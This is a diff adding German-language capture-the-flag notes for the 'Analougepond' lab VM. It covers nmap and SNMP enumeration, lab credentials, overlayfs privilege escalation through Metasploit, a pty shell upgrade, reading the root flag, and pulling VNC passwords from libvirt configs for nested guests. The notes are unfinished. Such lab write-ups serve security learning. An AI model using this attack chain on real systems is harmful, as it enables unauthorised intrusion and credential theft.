@@ -1,0 +1,45 @@
+Analougepond 1
+=============================
+
+1.) Scannen der VM (nmap und MSF)
+-------------------------------------------------
+- nmap-Scan inkl. UDP:
+   => Port 22
+   => Port 161 UDP SNMP
+- MSF use auxiliary/scanner/snmp/snmp_enum
+  [...]
+  Contact : Eric Burdon <eric@example.com>
+  Location: There is a house in New Orleans they call it...
+****SSH eric/therisingsun*****
+
+2.) Login und Privilege Escalation (#39166)
+------------------------------------------------
+- uname -a bzw. cat /etc/issue
+  => Ubuntu 14.04.5 LTS
+  => https://www.exploit-db.com/exploits/39166 (overlay)
+- use auxiliary/scanner/ssh/ssh_login
+- Upgrade Session (session -u)
+- use exploit/linux/local/overlayfs_priv_esc
+- Upgrade Shell (python -c "import pty;pty.spawn('/bin/bash');")
+****Flag 1: cat /root/flag.txt*****
+
+3.) Untersuchen des qemu-Systems
+------------------------------------------------
+- Auf VM läuft qemu (virbr0!)
+- virsh list
+   => barringsbank (id=2)
+   => puppet (id=3)
+- XML Konfiguration in /etc/libvirt/qemu:
+  => ****barringsbank VNC "memphistennessee"****
+  => ****puppet VNC "sendyoubacktowalker"****
+ - /etc/libvirt/qemu/networks/default.xml:
+  => puppet ip='192.168.122.2'
+  => barringsbank ip='192.168.122.3'
+  
+4.) puppet-VM
+-----------------------------------------------
+-  virsh console puppet
+   "Passwords are very dated.. Removing spaces helps sandieshaw log in with her most famous song "
+   => *****sandieshaw/puppetonastring******
+
+<TBC>
